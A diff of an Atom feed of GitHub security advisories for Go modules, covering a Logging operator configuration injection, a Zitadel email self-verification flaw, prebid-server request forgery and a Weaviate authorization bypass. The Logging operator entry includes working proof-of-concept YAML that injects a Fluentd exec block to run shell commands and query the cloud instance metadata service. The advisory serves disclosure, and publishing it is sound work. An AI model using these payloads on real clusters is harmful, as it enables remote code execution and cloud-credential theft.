@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-07-29T15:02:59.378Z</updated>
+    <updated>2026-07-29T17:02:24.222Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,419 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/kube-logging/logging-operator] Logging operator has Fluentd configuration injection that allows remote code execution]]></title>
+        <id>https://github.com/advisories/GHSA-mjqf-28ph-426h</id>
+        <link href="https://github.com/advisories/GHSA-mjqf-28ph-426h"/>
+        <updated>2026-07-29T17:01:29.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The Fluentd configuration renderer in Logging operator writes strings from CRDs such as <code>Flow</code> directly into <code>fluent.conf</code> without escaping them. As a result, a user who can create <code>Flow</code> resources can inject Fluentd configuration by providing values that contain newlines.</p>
+<p>In the confirmed path, a value in <code>record_transformer.records</code> can close the current <code>&lt;record&gt;</code> / <code>&lt;filter&gt;</code> block and add a new <code>&lt;match **&gt;</code> block. By specifying Fluentd's core <code>@type exec</code> plugin in that injected block, an attacker can execute arbitrary commands inside the Fluentd aggregator.</p>
+<h3 id="details">Details</h3>
+<p>The issue is in <code>FluentRender</code> in <code>pkg/sdk/logging/model/render/fluent.go</code>.</p>
+<p><a href="https://github.com/kube-logging/logging-operator/blob/98275d2984aa8d731c4c975b8006aa433fc7bafa/pkg/sdk/logging/model/render/fluent.go#L60-L87">https://github.com/kube-logging/logging-operator/blob/98275d2984aa8d731c4c975b8006aa433fc7bafa/pkg/sdk/logging/model/render/fluent.go#L60-L87</a></p>
+<p>Each parameter is rendered as <code>key value</code>, but values are not quoted, and newlines or characters such as <code>&lt;</code> and <code>&gt;</code> are not rejected. In addition, <code>indentedf</code> builds the string with <code>fmt.Sprintf</code> and then splits it on <code>\n</code>, so newlines inside CRD values become new lines in the generated Fluentd configuration.</p>
+<p>One input source is <code>record_transformer.records</code>. <code>ToDirective</code> passes <code>Record</code> (<code>map[string]string</code>) into <code>Params</code> without validation or escaping.</p>
+<p><a href="https://github.com/kube-logging/logging-operator/blob/98275d2984aa8d731c4c975b8006aa433fc7bafa/pkg/sdk/logging/model/filter/record_transformer.go#L92-L103">https://github.com/kube-logging/logging-operator/blob/98275d2984aa8d731c4c975b8006aa433fc7bafa/pkg/sdk/logging/model/filter/record_transformer.go#L92-L103</a></p>
+<p>The config check in <code>pkg/resources/fluentd/appconfigmap.go</code> runs <code>fluentd -c ... --dry-run</code>, but it passes as long as the injected configuration is syntactically valid Fluentd configuration. <code>@type exec</code> is a core Fluentd plugin and is available in the official Fluentd image.</p>
+<h3 id="poc">PoC</h3>
+<p>The prerequisite is that Logging operator is running with a Fluentd aggregator configuration and that the attacker can create <code>Flow</code> and <code>Output</code> resources in a watched namespace, for example <code>tenant-a</code>.</p>
+<p>First, create a minimal <code>Output</code> as the log destination.</p>
+<pre><code class="language-yaml">apiVersion: logging.banzaicloud.io/v1beta1
+kind: Output
+metadata:
+  name: sink
+  namespace: tenant-a
+spec:
+  nullout: {}
+</code></pre>
+<p>Next, create a <code>Flow</code> whose <code>record_transformer.records</code> value contains an injected <code>@type exec</code> block.</p>
+<pre><code class="language-yaml">apiVersion: logging.banzaicloud.io/v1beta1
+kind: Flow
+metadata:
+  name: exfil
+  namespace: tenant-a
+spec:
+  match:
+    - select: {}
+  filters:
+    - record_transformer:
+        records:
+          - x: |-
+              y
+              &lt;/record&gt;
+              &lt;/filter&gt;
+              &lt;match **&gt;
+                @type exec
+                command /bin/sh -c "id &gt; /tmp/pwned"
+                &lt;format&gt;
+                  @type json
+                &lt;/format&gt;
+                &lt;buffer&gt;
+                  flush_interval 1s
+                &lt;/buffer&gt;
+              &lt;/match&gt;
+              &lt;filter dummy.**&gt;
+                @type record_transformer
+                &lt;record&gt;
+                  absorbed y
+  localOutputRefs:
+    - sink
+</code></pre>
+<p>After applying the manifests, the Fluentd configuration Secret generated by the operator contains <code>@type exec</code>.</p>
+<pre><code class="language-sh">kubectl apply -f output.yaml -f flow.yaml
+
+kubectl -n &lt;control-namespace&gt; get secret &lt;logging&gt;-fluentd-app \
+  -o go-template='{{ index .data "fluentd.conf" }}' \
+  | base64 -d | grep -A8 '@type exec'
+</code></pre>
+<p>When any Pod in <code>tenant-a</code> emits logs, those logs flow into the injected <code>&lt;match **&gt;</code> block. When <code>out_exec</code> flushes its buffer, the command is executed and can be confirmed as follows.</p>
+<pre><code class="language-sh">kubectl -n &lt;control-namespace&gt; exec &lt;fluentd-aggregator-pod&gt; -- cat /tmp/pwned
+# expected:
+uid=100(fluent) gid=101(fluent) groups=101(fluent)
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This is remote code execution (RCE) against the Fluentd aggregator managed by Logging operator.
+Because the Fluentd aggregator collects and routes logs for namespaces / tenants in the Logging domain, a user who can create <code>Flow</code> / <code>Output</code> resources in one namespace can execute arbitrary commands inside the shared aggregator.</p>
+<p>In environments such as AWS EKS, the Fluentd Pod may be able to reach the node's Instance Metadata Service (IMDS). This was confirmed on EKS 1.35. The core issue is arbitrary command execution, so the same class of attack is possible even when IMDSv2 is required. The following <code>Flow</code> example uses IMDSv1 only to make reachability easy to demonstrate.</p>
+<pre><code class="language-yaml">apiVersion: logging.banzaicloud.io/v1beta1
+kind: Flow
+metadata:
+  name: imds-poc
+  namespace: tenant-a
+spec:
+  match:
+    - select: {}
+  filters:
+    - record_transformer:
+        records:
+          - x: |-
+              y
+              &lt;/record&gt;
+              &lt;/filter&gt;
+              &lt;match **&gt;
+                @type exec
+                command /bin/sh -c "curl -sS http://169.254.169.254/latest/meta-data/instance-id -o /tmp/imds-poc"
+                &lt;format&gt;
+                  @type json
+                &lt;/format&gt;
+                &lt;buffer&gt;
+                  flush_interval 1s
+                &lt;/buffer&gt;
+              &lt;/match&gt;
+              &lt;filter dummy.**&gt;
+                @type record_transformer
+                &lt;record&gt;
+                  absorbed y
+  localOutputRefs:
+    - sink
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/kube-logging/logging-operator/security/advisories/GHSA-mjqf-28ph-426h">https://github.com/kube-logging/logging-operator/security/advisories/GHSA-mjqf-28ph-426h</a></li>
+<li><a href="https://github.com/kube-logging/logging-operator/commit/cf437d7f1e056c78740bf5716ac8bdebcf002425">https://github.com/kube-logging/logging-operator/commit/cf437d7f1e056c78740bf5716ac8bdebcf002425</a></li>
+<li><a href="https://github.com/kube-logging/logging-operator/releases/tag/6.6.0">https://github.com/kube-logging/logging-operator/releases/tag/6.6.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-mjqf-28ph-426h">https://github.com/advisories/GHSA-mjqf-28ph-426h</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mjqf-28ph-426h</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-29T17:01:29.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/zitadel/zitadel] ZITADEL Users Can Self-Verify Email/Phone via API]]></title>
+        <id>https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</id>
+        <link href="https://github.com/advisories/GHSA-jq8w-8q2f-ffm9"/>
+        <updated>2026-07-29T16:54:53.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A vulnerability in Zitadel's self-management capability allowed users to mark their email and phone as verified without going through an actual verification process.</p>
+<p>While <a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-282g-fhmx-xf54"><code>GHSA-282g-fhmx-xf54</code></a> (CVE-2026-27946, "Users Can Self-Verify Email/Phone via UpdateHumanUser API") closed the path that let any authenticated user mark an arbitrary email or phone as verified on their own account by calling <code>UpdateHumanUser</code> with <code>email.is_verified: true</code>, additional paths were discovered.</p>
+<h3 id="impact">Impact</h3>
+<p>Zitadel provides an API for managing users. The API also allows users to self-manage their own data including updating the email and phone.</p>
+<p>Due to an improper permission check, the API allowed returning the verification code for the email and phone to the own user.
+This allows users to claim ownership of an email or phone they do not control and potentially bypass email-based security policies.</p>
+<p>Note that when changing another user's email or phone, regardless of the verification flag, the permissions were correctly checked.</p>
+<h3 id="affected-versions">Affected Versions</h3>
+<p>Systems running one of the following versions are affected:</p>
+<ul>
+<li><strong>4.x</strong>: <code>4.0.0</code> through <code>4.15.0</code> (including RC versions)</li>
+<li><strong>3.x</strong>: <code>3.0.0</code> through <code>3.4.10</code> (including RC versions)</li>
+<li><strong>2.x</strong>: <code>2.43.0</code> through <code>2.71.19</code></li>
+</ul>
+<h3 id="patches">Patches</h3>
+<p>The vulnerability has been addressed in the latest releases. The patch resolves the issue by requiring the correct permission in case the verification flag is provided and only allows self-management of the email address, resp. phone number itself.</p>
+<p>4.x: Upgrade to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v4.15.1">4.15.1</a>
+3.x: Update to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">3.4.11</a>
+2.x: Update to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">3.4.11</a></p>
+<h3 id="workarounds">Workarounds</h3>
+<p>The recommended solution is to upgrade to a patched version. If an upgrade is not possible, an action (v2) could be used to prevent returning the verification code to the own user.</p>
+<h3 id="questions">Questions</h3>
+<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
+<h3 id="credits">Credits</h3>
+<p>Thanks to <a href="https://github.com/eddieran">eddieran</a> for reporting this vulnerability.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-jq8w-8q2f-ffm9">https://github.com/zitadel/zitadel/security/advisories/GHSA-jq8w-8q2f-ffm9</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/90f310212d3a5075084a603bf61fed549c92956d">https://github.com/zitadel/zitadel/commit/90f310212d3a5075084a603bf61fed549c92956d</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/a1748b2f0326ddf7be0de44b4f980ae2c07c0151">https://github.com/zitadel/zitadel/commit/a1748b2f0326ddf7be0de44b4f980ae2c07c0151</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/ed09b3df7f43e870423e4d8f2757e6894481604f">https://github.com/zitadel/zitadel/commit/ed09b3df7f43e870423e4d8f2757e6894481604f</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">https://github.com/zitadel/zitadel/releases/tag/v3.4.11</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v4.15.1">https://github.com/zitadel/zitadel/releases/tag/v4.15.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-jq8w-8q2f-ffm9">https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-29T16:54:49.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/zitadel/zitadel] ZITADEL Users Can Self-Verify Email/Phone via API]]></title>
+        <id>https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</id>
+        <link href="https://github.com/advisories/GHSA-jq8w-8q2f-ffm9"/>
+        <updated>2026-07-29T16:54:53.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A vulnerability in Zitadel's self-management capability allowed users to mark their email and phone as verified without going through an actual verification process.</p>
+<p>While <a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-282g-fhmx-xf54"><code>GHSA-282g-fhmx-xf54</code></a> (CVE-2026-27946, "Users Can Self-Verify Email/Phone via UpdateHumanUser API") closed the path that let any authenticated user mark an arbitrary email or phone as verified on their own account by calling <code>UpdateHumanUser</code> with <code>email.is_verified: true</code>, additional paths were discovered.</p>
+<h3 id="impact">Impact</h3>
+<p>Zitadel provides an API for managing users. The API also allows users to self-manage their own data including updating the email and phone.</p>
+<p>Due to an improper permission check, the API allowed returning the verification code for the email and phone to the own user.
+This allows users to claim ownership of an email or phone they do not control and potentially bypass email-based security policies.</p>
+<p>Note that when changing another user's email or phone, regardless of the verification flag, the permissions were correctly checked.</p>
+<h3 id="affected-versions">Affected Versions</h3>
+<p>Systems running one of the following versions are affected:</p>
+<ul>
+<li><strong>4.x</strong>: <code>4.0.0</code> through <code>4.15.0</code> (including RC versions)</li>
+<li><strong>3.x</strong>: <code>3.0.0</code> through <code>3.4.10</code> (including RC versions)</li>
+<li><strong>2.x</strong>: <code>2.43.0</code> through <code>2.71.19</code></li>
+</ul>
+<h3 id="patches">Patches</h3>
+<p>The vulnerability has been addressed in the latest releases. The patch resolves the issue by requiring the correct permission in case the verification flag is provided and only allows self-management of the email address, resp. phone number itself.</p>
+<p>4.x: Upgrade to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v4.15.1">4.15.1</a>
+3.x: Update to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">3.4.11</a>
+2.x: Update to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">3.4.11</a></p>
+<h3 id="workarounds">Workarounds</h3>
+<p>The recommended solution is to upgrade to a patched version. If an upgrade is not possible, an action (v2) could be used to prevent returning the verification code to the own user.</p>
+<h3 id="questions">Questions</h3>
+<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
+<h3 id="credits">Credits</h3>
+<p>Thanks to <a href="https://github.com/eddieran">eddieran</a> for reporting this vulnerability.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-jq8w-8q2f-ffm9">https://github.com/zitadel/zitadel/security/advisories/GHSA-jq8w-8q2f-ffm9</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/90f310212d3a5075084a603bf61fed549c92956d">https://github.com/zitadel/zitadel/commit/90f310212d3a5075084a603bf61fed549c92956d</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/a1748b2f0326ddf7be0de44b4f980ae2c07c0151">https://github.com/zitadel/zitadel/commit/a1748b2f0326ddf7be0de44b4f980ae2c07c0151</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/ed09b3df7f43e870423e4d8f2757e6894481604f">https://github.com/zitadel/zitadel/commit/ed09b3df7f43e870423e4d8f2757e6894481604f</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">https://github.com/zitadel/zitadel/releases/tag/v3.4.11</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v4.15.1">https://github.com/zitadel/zitadel/releases/tag/v4.15.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-jq8w-8q2f-ffm9">https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-29T16:54:49.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/zitadel/zitadel] ZITADEL Users Can Self-Verify Email/Phone via API]]></title>
+        <id>https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</id>
+        <link href="https://github.com/advisories/GHSA-jq8w-8q2f-ffm9"/>
+        <updated>2026-07-29T16:54:53.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A vulnerability in Zitadel's self-management capability allowed users to mark their email and phone as verified without going through an actual verification process.</p>
+<p>While <a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-282g-fhmx-xf54"><code>GHSA-282g-fhmx-xf54</code></a> (CVE-2026-27946, "Users Can Self-Verify Email/Phone via UpdateHumanUser API") closed the path that let any authenticated user mark an arbitrary email or phone as verified on their own account by calling <code>UpdateHumanUser</code> with <code>email.is_verified: true</code>, additional paths were discovered.</p>
+<h3 id="impact">Impact</h3>
+<p>Zitadel provides an API for managing users. The API also allows users to self-manage their own data including updating the email and phone.</p>
+<p>Due to an improper permission check, the API allowed returning the verification code for the email and phone to the own user.
+This allows users to claim ownership of an email or phone they do not control and potentially bypass email-based security policies.</p>
+<p>Note that when changing another user's email or phone, regardless of the verification flag, the permissions were correctly checked.</p>
+<h3 id="affected-versions">Affected Versions</h3>
+<p>Systems running one of the following versions are affected:</p>
+<ul>
+<li><strong>4.x</strong>: <code>4.0.0</code> through <code>4.15.0</code> (including RC versions)</li>
+<li><strong>3.x</strong>: <code>3.0.0</code> through <code>3.4.10</code> (including RC versions)</li>
+<li><strong>2.x</strong>: <code>2.43.0</code> through <code>2.71.19</code></li>
+</ul>
+<h3 id="patches">Patches</h3>
+<p>The vulnerability has been addressed in the latest releases. The patch resolves the issue by requiring the correct permission in case the verification flag is provided and only allows self-management of the email address, resp. phone number itself.</p>
+<p>4.x: Upgrade to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v4.15.1">4.15.1</a>
+3.x: Update to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">3.4.11</a>
+2.x: Update to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">3.4.11</a></p>
+<h3 id="workarounds">Workarounds</h3>
+<p>The recommended solution is to upgrade to a patched version. If an upgrade is not possible, an action (v2) could be used to prevent returning the verification code to the own user.</p>
+<h3 id="questions">Questions</h3>
+<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
+<h3 id="credits">Credits</h3>
+<p>Thanks to <a href="https://github.com/eddieran">eddieran</a> for reporting this vulnerability.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-jq8w-8q2f-ffm9">https://github.com/zitadel/zitadel/security/advisories/GHSA-jq8w-8q2f-ffm9</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/90f310212d3a5075084a603bf61fed549c92956d">https://github.com/zitadel/zitadel/commit/90f310212d3a5075084a603bf61fed549c92956d</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/a1748b2f0326ddf7be0de44b4f980ae2c07c0151">https://github.com/zitadel/zitadel/commit/a1748b2f0326ddf7be0de44b4f980ae2c07c0151</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/ed09b3df7f43e870423e4d8f2757e6894481604f">https://github.com/zitadel/zitadel/commit/ed09b3df7f43e870423e4d8f2757e6894481604f</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">https://github.com/zitadel/zitadel/releases/tag/v3.4.11</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v4.15.1">https://github.com/zitadel/zitadel/releases/tag/v4.15.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-jq8w-8q2f-ffm9">https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-29T16:54:49.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/prebid/prebid-server] prebid-server's request forgery vulnerability allows for possible host environment data extraction]]></title>
+        <id>https://github.com/advisories/GHSA-4p3g-4hcj-wpvx</id>
+        <link href="https://github.com/advisories/GHSA-4p3g-4hcj-wpvx"/>
+        <updated>2026-07-29T16:00:36.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Certain bidder adapters accept user-supplied parameters that are interpolated into outbound request URLs. Without proper input validation, a malicious actor could craft bid request parameters that cause the server to send HTTP requests to unintended destinations, potentially exposing internal network services or sensitive server endpoints to unauthorized access.</p>
+<h3 id="patches">Patches</h3>
+<p>Patched in <a href="https://github.com/prebid/prebid-server/releases/tag/v4.4.0">v4.4.0</a></p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If one is unable to update, please make sure that the affected bidder adapters are disabled.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/prebid/prebid-server/security/advisories/GHSA-4p3g-4hcj-wpvx">https://github.com/prebid/prebid-server/security/advisories/GHSA-4p3g-4hcj-wpvx</a></li>
+<li><a href="https://github.com/prebid/prebid-server/pull/4802">https://github.com/prebid/prebid-server/pull/4802</a></li>
+<li><a href="https://github.com/prebid/prebid-server/commit/494ac271cd4b5024df9123ef25ca3cff96390be3">https://github.com/prebid/prebid-server/commit/494ac271cd4b5024df9123ef25ca3cff96390be3</a></li>
+<li><a href="https://github.com/prebid/prebid-server/releases/tag/v4.4.0">https://github.com/prebid/prebid-server/releases/tag/v4.4.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-4p3g-4hcj-wpvx">https://github.com/advisories/GHSA-4p3g-4hcj-wpvx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4p3g-4hcj-wpvx</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-29T16:00:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/prebid/prebid-server/v2] prebid-server's request forgery vulnerability allows for possible host environment data extraction]]></title>
+        <id>https://github.com/advisories/GHSA-4p3g-4hcj-wpvx</id>
+        <link href="https://github.com/advisories/GHSA-4p3g-4hcj-wpvx"/>
+        <updated>2026-07-29T16:00:36.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Certain bidder adapters accept user-supplied parameters that are interpolated into outbound request URLs. Without proper input validation, a malicious actor could craft bid request parameters that cause the server to send HTTP requests to unintended destinations, potentially exposing internal network services or sensitive server endpoints to unauthorized access.</p>
+<h3 id="patches">Patches</h3>
+<p>Patched in <a href="https://github.com/prebid/prebid-server/releases/tag/v4.4.0">v4.4.0</a></p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If one is unable to update, please make sure that the affected bidder adapters are disabled.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/prebid/prebid-server/security/advisories/GHSA-4p3g-4hcj-wpvx">https://github.com/prebid/prebid-server/security/advisories/GHSA-4p3g-4hcj-wpvx</a></li>
+<li><a href="https://github.com/prebid/prebid-server/pull/4802">https://github.com/prebid/prebid-server/pull/4802</a></li>
+<li><a href="https://github.com/prebid/prebid-server/commit/494ac271cd4b5024df9123ef25ca3cff96390be3">https://github.com/prebid/prebid-server/commit/494ac271cd4b5024df9123ef25ca3cff96390be3</a></li>
+<li><a href="https://github.com/prebid/prebid-server/releases/tag/v4.4.0">https://github.com/prebid/prebid-server/releases/tag/v4.4.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-4p3g-4hcj-wpvx">https://github.com/advisories/GHSA-4p3g-4hcj-wpvx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4p3g-4hcj-wpvx</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-29T16:00:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/prebid/prebid-server/v3] prebid-server's request forgery vulnerability allows for possible host environment data extraction]]></title>
+        <id>https://github.com/advisories/GHSA-4p3g-4hcj-wpvx</id>
+        <link href="https://github.com/advisories/GHSA-4p3g-4hcj-wpvx"/>
+        <updated>2026-07-29T16:00:36.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Certain bidder adapters accept user-supplied parameters that are interpolated into outbound request URLs. Without proper input validation, a malicious actor could craft bid request parameters that cause the server to send HTTP requests to unintended destinations, potentially exposing internal network services or sensitive server endpoints to unauthorized access.</p>
+<h3 id="patches">Patches</h3>
+<p>Patched in <a href="https://github.com/prebid/prebid-server/releases/tag/v4.4.0">v4.4.0</a></p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If one is unable to update, please make sure that the affected bidder adapters are disabled.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/prebid/prebid-server/security/advisories/GHSA-4p3g-4hcj-wpvx">https://github.com/prebid/prebid-server/security/advisories/GHSA-4p3g-4hcj-wpvx</a></li>
+<li><a href="https://github.com/prebid/prebid-server/pull/4802">https://github.com/prebid/prebid-server/pull/4802</a></li>
+<li><a href="https://github.com/prebid/prebid-server/commit/494ac271cd4b5024df9123ef25ca3cff96390be3">https://github.com/prebid/prebid-server/commit/494ac271cd4b5024df9123ef25ca3cff96390be3</a></li>
+<li><a href="https://github.com/prebid/prebid-server/releases/tag/v4.4.0">https://github.com/prebid/prebid-server/releases/tag/v4.4.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-4p3g-4hcj-wpvx">https://github.com/advisories/GHSA-4p3g-4hcj-wpvx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4p3g-4hcj-wpvx</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-29T16:00:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/prebid/prebid-server/v4] prebid-server's request forgery vulnerability allows for possible host environment data extraction]]></title>
+        <id>https://github.com/advisories/GHSA-4p3g-4hcj-wpvx</id>
+        <link href="https://github.com/advisories/GHSA-4p3g-4hcj-wpvx"/>
+        <updated>2026-07-29T16:00:36.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Certain bidder adapters accept user-supplied parameters that are interpolated into outbound request URLs. Without proper input validation, a malicious actor could craft bid request parameters that cause the server to send HTTP requests to unintended destinations, potentially exposing internal network services or sensitive server endpoints to unauthorized access.</p>
+<h3 id="patches">Patches</h3>
+<p>Patched in <a href="https://github.com/prebid/prebid-server/releases/tag/v4.4.0">v4.4.0</a></p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If one is unable to update, please make sure that the affected bidder adapters are disabled.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/prebid/prebid-server/security/advisories/GHSA-4p3g-4hcj-wpvx">https://github.com/prebid/prebid-server/security/advisories/GHSA-4p3g-4hcj-wpvx</a></li>
+<li><a href="https://github.com/prebid/prebid-server/pull/4802">https://github.com/prebid/prebid-server/pull/4802</a></li>
+<li><a href="https://github.com/prebid/prebid-server/commit/494ac271cd4b5024df9123ef25ca3cff96390be3">https://github.com/prebid/prebid-server/commit/494ac271cd4b5024df9123ef25ca3cff96390be3</a></li>
+<li><a href="https://github.com/prebid/prebid-server/releases/tag/v4.4.0">https://github.com/prebid/prebid-server/releases/tag/v4.4.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-4p3g-4hcj-wpvx">https://github.com/advisories/GHSA-4p3g-4hcj-wpvx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4p3g-4hcj-wpvx</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-29T16:00:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/weaviate/weaviate] Weaviate has an Improper Authorization issue]]></title>
+        <id>https://github.com/advisories/GHSA-jqpm-wf57-qx5c</id>
+        <link href="https://github.com/advisories/GHSA-jqpm-wf57-qx5c"/>
+        <updated>2026-07-29T15:41:15.000Z</updated>
+        <content type="html"><![CDATA[<p>A vulnerability was identified in Weaviate up to 1.37.7. This vulnerability affects the function validateConfig of the file usecases/auth/authentication/apikey/client.go of the component Static API Key Handler. The manipulation of the argument StaticApiKey leads to authorization bypass. It is possible to initiate the attack remotely. The complexity of an attack is rather high. It is stated that the exploitability is difficult. The exploit is publicly available and might be used. Upgrading to version 1.38.0-rc.0 is able to resolve this issue. The identifier of the patch is 40f2cc32279f0f8a51016c3c6870a2c0c808e6c0. You should upgrade the affected component.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-11500">https://nvd.nist.gov/vuln/detail/CVE-2026-11500</a></li>
+<li><a href="https://github.com/weaviate/weaviate/issues/11392">https://github.com/weaviate/weaviate/issues/11392</a></li>
+<li><a href="https://github.com/weaviate/weaviate/commit/40f2cc32279f0f8a51016c3c6870a2c0c808e6c0">https://github.com/weaviate/weaviate/commit/40f2cc32279f0f8a51016c3c6870a2c0c808e6c0</a></li>
+<li><a href="https://github.com/weaviate/weaviate">https://github.com/weaviate/weaviate</a></li>
+<li><a href="https://github.com/weaviate/weaviate/releases/tag/v1.38.0-rc.0">https://github.com/weaviate/weaviate/releases/tag/v1.38.0-rc.0</a></li>
+<li><a href="https://vuldb.com/cve/CVE-2026-11500">https://vuldb.com/cve/CVE-2026-11500</a></li>
+<li><a href="https://vuldb.com/submit/835080">https://vuldb.com/submit/835080</a></li>
